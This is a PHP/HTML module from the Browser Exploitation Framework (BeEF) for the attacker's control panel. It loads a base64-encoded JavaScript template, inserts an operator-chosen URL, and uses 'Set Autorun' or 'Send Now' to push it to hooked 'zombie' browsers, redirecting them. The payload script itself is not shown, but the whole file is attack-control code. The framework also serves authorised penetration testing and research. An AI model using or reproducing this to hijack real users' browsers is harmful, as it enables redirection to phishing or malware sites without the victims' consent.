<?
	// Copyright (c) 2006-2009, Wade Alcorn 
	// All Rights Reserved
	// wade@bindshell.net - http://www.bindshell.net

	require_once("../../../include/common.inc.php"); // included for get_b64_file()
	DEFINE('JS_FILE', './template.js');
?>

<script>

	get_b64_code_redirect = function () {
		// javascript is loaded from a file - it could be hard coded
		var b64code = '<? echo get_b64_file(JS_FILE); ?>';

		// replace sections of the code with user input
		b64code = b64replace(b64code, "REDIRECTURL", document.myform.url_str.value);
		
		return b64code;
	}

	Element.Methods.set_autorun = function() {
		ar.enable('Browser Redirect', get_b64_code_redirect());
	}
	
	Element.Methods.send_now = function() {
		do_send(get_b64_code_redirect());
	}

	// add construct code to DOM
	Element.addMethods();
</script>

<!-- PAGE CONTENT -->
<div id="module_header">Redirect Browser</div>
This module will redirect the selected zombie browsers to the address specified in the 
'Redirect URL' input.<br><br> 

<div id="module_subsection">
	<form name="myform">
		<div id="module_subsection_header">Redirect URL</div>
		<input type="text" width="90%" name="url_str" value="http://www.bindshell.net/"/>
		<input class="button" type="button" value=" Set Autorun " onClick="javascript:set_autorun()"/>
		<input class="button" type="button" value=" Send Now " onClick="javascript:send_now()"/>
	</form>
</div>
